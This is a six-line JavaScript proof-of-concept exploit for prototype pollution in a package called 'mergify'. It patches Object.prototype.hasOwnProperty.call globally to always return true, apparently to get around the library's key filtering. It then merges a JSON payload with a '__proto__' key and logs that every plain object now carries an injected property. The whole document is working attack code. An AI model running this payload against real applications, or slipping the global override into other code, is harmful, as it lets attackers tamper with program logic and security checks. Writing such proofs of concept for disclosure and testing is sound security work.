Object.prototype.hasOwnProperty.call = () => true;
const mergify = require('mergify');
const payload = '{"__proto__":{"polluted":"yes"}}';
console.log({}.polluted);
mergify({}, JSON.parse(payload));
console.log({}.polluted);